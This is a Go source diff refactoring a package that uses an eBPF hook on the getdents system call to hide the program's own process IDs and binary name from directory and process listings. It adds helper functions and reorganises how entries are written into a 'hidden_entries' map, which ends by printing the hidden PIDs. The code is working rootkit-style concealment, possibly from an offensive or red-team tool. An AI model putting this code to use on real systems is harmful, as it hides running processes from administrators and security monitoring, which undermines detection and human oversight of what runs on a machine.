@@ -1,5 +1,5 @@
-// Package core provides utilities to manage hidden PIDs and binary file via eBPF getdents hook.
-package core
+// Package ebpf provides utilities to manage hidden PIDs and binary file via eBPF getdents hook.
+package ebpf
 
 import (
 	"bytes"
@@ -28,6 +28,18 @@ type HiddenEntry struct {
 	NameLen int32
 }
 
+// matchesBinary returns true if the process with pid matches the binary name (exe or cmdline)
+func matchesBinary(pid int, binaryName string) bool {
+	exePath := fmt.Sprintf("/proc/%d/exe", pid)
+	target, err := os.Readlink(exePath)
+	if err == nil && strings.Contains(target, binaryName) {
+		return true
+	}
+	cmdlinePath := fmt.Sprintf("/proc/%d/cmdline", pid)
+	cmdlineBytes, err := os.ReadFile(cmdlinePath)
+	return err == nil && strings.Contains(string(cmdlineBytes), binaryName)
+}
+
 // getYodaPIDs returns all PIDs of running processes whose executable matches the current binary name.
 func getYodaPIDs() ([]int, error) {
 	selfExe, err := os.Readlink("/proc/self/exe")
@@ -48,23 +60,7 @@ func getYodaPIDs() ([]int, error) {
 		if err != nil {
 			continue
 		}
-		exePath := fmt.Sprintf("/proc/%d/exe", pid)
-		target, err := os.Readlink(exePath)
-		found := false
-		if err == nil && strings.Contains(target, binaryName) {
-			found = true
-		} else {
-			// Check cmdline if exe doesn't match
-			cmdlinePath := fmt.Sprintf("/proc/%d/cmdline", pid)
-			cmdlineBytes, err := os.ReadFile(cmdlinePath)
-			if err == nil {
-				cmdline := string(cmdlineBytes)
-				if strings.Contains(cmdline, binaryName) {
-					found = true
-				}
-			}
-		}
-		if found {
+		if matchesBinary(pid, binaryName) {
 			pids = append(pids, pid)
 		}
 	}
@@ -97,28 +93,26 @@ func loadGetdentsBPF() (*ebpf.Collection, error) {
 // populateHiddenEntries ajoute les PIDs et le nom du binaire à la map hidden_entries.
 func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) error {
 	idx := 0
-	for _, pid := range pids {
+	for _, val := range append(pids, -1) {
 		if idx >= MaxHidden {
 			break
 		}
-		pidStr := strconv.Itoa(pid)
 		var entry HiddenEntry
-		copy(entry.Name[:], pidStr)
-		entry.NameLen = int32(len(pidStr))
+		if val == -1 && binName != "" {
+			copy(entry.Name[:], binName)
+			entry.NameLen = int32(len(binName))
+		} else if val != -1 {
+			pidStr := strconv.Itoa(val)
+			copy(entry.Name[:], pidStr)
+			entry.NameLen = int32(len(pidStr))
+		} else {
+			continue
+		}
 		key := uint32(idx)
 		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
 			return fmt.Errorf("failed to update hidden_entries[%d]: %w", idx, err)
 		}
 		idx++
-	}
-	if idx < MaxHidden && binName != "" {
-		var entry HiddenEntry
-		copy(entry.Name[:], binName)
-		entry.NameLen = int32(len(binName))
-		key := uint32(idx)
-		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
-			return fmt.Errorf("failed to update hidden_entries[%d] (binName): %w", idx, err)
-		}
 	}
 	return nil
 }
@@ -130,17 +124,7 @@ func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
 	if err != nil {
 		return nil, nil, err
 	}
-	pidSet := make(map[int]struct{})
-	for _, pid := range pids {
-		pidSet[pid] = struct{}{}
-	}
-	for _, pid := range extraPIDs {
-		pidSet[pid] = struct{}{}
-	}
-	mergedPIDs := make([]int, 0, len(pidSet))
-	for pid := range pidSet {
-		mergedPIDs = append(mergedPIDs, pid)
-	}
+	mergedPIDs := mergeUniquePIDs(pids, extraPIDs)
 
 	binName, err := getBinaryName()
 	if err != nil {
@@ -177,6 +161,22 @@ func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
 	}
 	fmt.Printf("👻 Hidden PIDs: %v\n\n", mergedPIDs)
 	return enterLink, exitLink, nil
+
+}
+
+func mergeUniquePIDs(a, b []int) []int {
+	pidSet := make(map[int]struct{}, len(a)+len(b))
+	for _, pid := range a {
+		pidSet[pid] = struct{}{}
+	}
+	for _, pid := range b {
+		pidSet[pid] = struct{}{}
+	}
+	merged := make([]int, 0, len(pidSet))
+	for pid := range pidSet {
+		merged = append(merged, pid)
+	}
+	return merged
 }
 
 func CloseLinks(links ...link.Link) {
